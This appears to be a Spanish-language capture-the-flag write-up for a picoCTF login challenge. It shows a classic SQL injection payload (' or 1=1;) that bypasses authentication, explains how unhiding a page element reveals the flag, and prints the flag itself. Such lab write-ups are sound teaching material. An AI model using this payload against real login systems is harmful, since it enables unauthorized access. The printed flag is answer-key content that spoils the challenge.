## Objetivo
Can you login to this website?Try to login [here](http://saturn.picoctf.net:57667/).
## Solución
- Al probar la pagina colocándole como usuario: admin y contraseña: admin me dice que es una conexión fallida.
```bash
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

Login failed.
```
- Así que cambiamos el valor del usuario por una inyección de código SQL.
```bash
username: ' or 1=1;
password: admind
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admind'

Logged in! But can you see the flag, it is in plainsight.
```
- Vemos que nos la da pista de que hay un elemento oculto, por lo que inspeccionamos la pagina y eliminamos el elemento hidden a la etiqueta y ya con eso muestra la bandera.
```bash
Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac} 
```

## Notas Adicionales
## Referencias